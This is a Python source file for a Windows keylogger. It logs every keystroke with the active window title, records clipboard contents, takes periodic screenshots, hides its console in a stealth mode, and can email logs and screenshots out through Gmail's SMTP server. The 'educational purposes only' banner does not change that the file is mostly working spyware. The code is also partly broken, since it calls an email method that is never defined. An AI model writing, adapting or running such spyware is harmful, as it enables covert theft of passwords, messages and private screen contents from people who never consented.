import os
import sys
import smtplib
import win32gui
import win32con
import pyperclip
from datetime import datetime
from pynput import keyboard
from dateutil import parser
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from PIL import ImageGrab
import threading
import time

class SimpleKeylogger:
    def __init__(self, email=None, password=None, stealth_mode=False):
        self.log_dir = "logs"
        self.current_log_file = None
        self.email = email
        self.password = password
        self.stealth_mode = stealth_mode
        self.last_clipboard = ""
        self.screenshot_interval = 300  # 5 minutes
        self.setup_log_directory()
        self.update_log_file()
        print(f"[DEBUG] Attempting to create log file at: {self.current_log_file}")
        try:
            with open(self.current_log_file, 'a', encoding='utf-8') as f:
                f.write(f"[INFO] Log file created at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f"[DEBUG] Log file successfully created at: {self.current_log_file}")
        except Exception as e:
            print(f"[ERROR] Failed to create log file: {e}")
        if self.stealth_mode:
            self.hide_window()
        # Start screenshot thread
        self.screenshot_thread = threading.Thread(target=self.take_screenshots, daemon=True)
        self.screenshot_thread.start()
        
    def setup_log_directory(self):
        """Create logs directory if it doesn't exist"""
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
            
    def update_log_file(self):
        """Create a new log file for the current day"""
        today = datetime.now().strftime("%Y-%m-%d")
        self.current_log_file = os.path.join(self.log_dir, f"keylog_{today}.txt")
        
    def hide_window(self):
        """Hide the console window in stealth mode"""
        if sys.platform == 'win32':
            console_window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(console_window, win32con.SW_HIDE)
            
    def get_active_window(self):
        """Get the title of the currently active window"""
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return "Unknown Window"
            
    def take_screenshots(self):
        """Take screenshots at regular intervals"""
        while True:
            try:
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                screenshot_path = os.path.join(self.log_dir, f"screenshot_{timestamp}.png")
                
                # Take screenshot
                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path)
                
                # Log screenshot
                with open(self.current_log_file, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Screenshot taken: {screenshot_path}\n")
                
                # Send email if configured
                if self.email and self.password:
                    self.send_email_with_screenshot("Keylogger Screenshot", screenshot_path)
                    
            except Exception as e:
                print(f"Error taking screenshot: {e}")
                
            time.sleep(self.screenshot_interval)
            
    def send_email_with_screenshot(self, subject, screenshot_path):
        """Send email with screenshot attachment"""
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = subject
            
            # Attach screenshot
            with open(screenshot_path, 'rb') as f:
                img = MIMEImage(f.read())
                img.add_header('Content-Disposition', 'attachment', filename=os.path.basename(screenshot_path))
                msg.attach(img)
                
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Error sending email with screenshot: {e}")
            
    def check_clipboard(self):
        """Check for clipboard changes"""
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != self.last_clipboard:
                self.last_clipboard = current_clipboard
                with open(self.current_log_file, 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Clipboard: {current_clipboard}\n")
        except Exception as e:
            print(f"Error checking clipboard: {e}")
            
    def on_press(self, key):
        """Handle key press events"""
        try:
            # Get current timestamp and active window
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            active_window = self.get_active_window()
            
            # Handle special keys
            if hasattr(key, 'char'):
                key_char = key.char
            else:
                key_char = str(key)
                
            # Write to log file
            with open(self.current_log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] Window: {active_window} | Key: {key_char}\n")
                
            # Check clipboard
            self.check_clipboard()
                
            # Send email if configured
            if self.email and self.password:
                with open(self.current_log_file, 'r', encoding='utf-8') as f:
                    log_content = f.read()
                self.send_email("Keylogger Log Update", log_content)
                
        except Exception as e:
            print(f"Error logging key: {e}")
            
    def on_release(self, key):
        """Handle key release events"""
        # Stop listener on ESC key
        if key == keyboard.Key.esc:
            return False
            
    def start(self):
        """Start the keylogger"""
        if not self.stealth_mode:
            print("Keylogger started. Press ESC to stop.")
        # Start keyboard listener only
        keyboard_listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release)
        keyboard_listener.start()
        # Join the keyboard listener (this will block until ESC is pressed)
        keyboard_listener.join()
        
    def stop(self):
        """Stop the keylogger"""
        if self.email and self.password:
            # Send final log
            with open(self.current_log_file, 'r', encoding='utf-8') as f:
                log_content = f.read()
            self.send_email("Keylogger Final Log", log_content)

if __name__ == "__main__":
    # Display ethical warning
    print("""
    ⚠️ ETHICAL WARNING ⚠️
    This keylogger is for educational purposes only.
    Always obtain proper consent before monitoring keyboard activity.
    Unauthorized use may be illegal and unethical.
    
    Press ENTER to continue or close this window to exit.
    """)
    input()
    
    # Start the keylogger
    keylogger = SimpleKeylogger()
    keylogger.start() 